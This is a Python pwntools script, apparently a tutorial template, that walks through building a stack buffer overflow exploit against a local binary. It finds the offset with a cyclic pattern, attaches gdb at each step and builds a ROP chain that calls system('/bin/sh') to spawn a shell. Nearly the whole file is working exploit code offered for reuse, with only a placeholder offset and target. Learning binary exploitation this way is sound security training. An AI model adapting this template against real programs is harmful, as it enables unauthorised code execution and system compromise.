#!/usr/bin/env python3
"""
Example: Complete Exploit Development with GDB Debugging

This example demonstrates the full workflow of developing an exploit
using gdb.attach() for debugging at each step.
"""

from pwn import *

# Configuration
context(arch='amd64', os='linux', log_level='info')
context.terminal = ['tmux', 'new-window', '-n', 'gdb', '-c', '{cwd}']
BINARY = './binary'

def step1_analyze_binary():
    """Step 1: Analyze the binary"""
    print("[*] Step 1: Analyzing binary...")
    elf = ELF(BINARY)
    print(f"[+] Protections: {elf.checksec()}")
    print(f"[+] Functions: {list(elf.symbols.keys())[:10]}")
    return elf

def step2_find_offset(elf):
    """Step 2: Find buffer overflow offset using cyclic pattern"""
    print("\n[*] Step 2: Finding buffer overflow offset...")

    # Debug script to catch crash
    gdb_script = '''
run
# When crash occurs, GDB will pause
info registers
# Note the rip value
'''

    print("[*] Sending cyclic pattern and attaching GDB...")
    p = gdb.debug(BINARY, gdb_script)
    p.sendline(cyclic(200))
    p.interactive()

    # After GDB session, manually calculate offset
    # Example: if rip = 0x61616161, then offset = cyclic_find(0x61616161)
    offset = 100  # Replace with actual offset
    print(f"[+] Offset: {offset}")
    return offset

def step3_verify_offset(elf, offset):
    """Step 3: Verify offset with simple payload"""
    print("\n[*] Step 3: Verifying offset...")

    # Debug script to inspect stack
    gdb_script = '''
break vulnerable_function
continue
x/20x $rsp
'''

    p = process(BINARY)
    gdb.attach(p, gdb_script)

    # Send test payload
    payload = b'A' * offset + p64(0xdeadbeef)
    p.sendline(payload)
    p.interactive()

def step4_build_exploit(elf, offset):
    """Step 4: Build and test exploit"""
    print("\n[*] Step 4: Building exploit...")

    # Find /bin/sh
    bin_sh = next(elf.search(b'/bin/sh'))
    print(f"[+] /bin/sh at: {hex(bin_sh)}")

    # Build ROP chain
    rop = ROP(elf)
    rop.call('system', [bin_sh])
    print("[+] ROP chain built")
    print(rop.dump())

    # Debug script to trace ROP execution
    gdb_script = '''
break main
continue
# Set breakpoint at first gadget
break *0x400000
continue
# Step through a few instructions
stepi
stepi
stepi
info registers
'''

    p = process(BINARY)
    gdb.attach(p, gdb_script)

    # Send exploit
    payload = b'A' * offset + rop.chain()
    print(f"[*] Sending payload ({len(payload)} bytes)...")
    p.sendline(payload)
    p.interactive()

def step5_test_exploit(elf, offset):
    """Step 5: Test exploit without GDB"""
    print("\n[*] Step 5: Testing exploit without GDB...")

    bin_sh = next(elf.search(b'/bin/sh'))
    rop = ROP(elf)
    rop.call('system', [bin_sh])

    payload = b'A' * offset + rop.chain()

    p = process(BINARY)
    p.sendline(payload)

    try:
        result = p.recvall(timeout=5)
        print(f"[+] Exploit successful!")
        print(result)
    except Exception as e:
        print(f"[-] Exploit failed: {e}")

def main():
    """Main exploit development workflow"""
    print("=" * 60)
    print("Exploit Development with GDB Debugging")
    print("=" * 60)

    # Step 1: Analyze binary
    elf = step1_analyze_binary()

    # Step 2: Find offset (interactive with GDB)
    # offset = step2_find_offset(elf)
    offset = 100  # Use known offset for demo

    # Step 3: Verify offset (interactive with GDB)
    # step3_verify_offset(elf, offset)

    # Step 4: Build and test exploit (interactive with GDB)
    # step4_build_exploit(elf, offset)

    # Step 5: Test exploit without GDB
    # step5_test_exploit(elf, offset)

    print("\n[*] Workflow complete!")

if __name__ == '__main__':
    main()
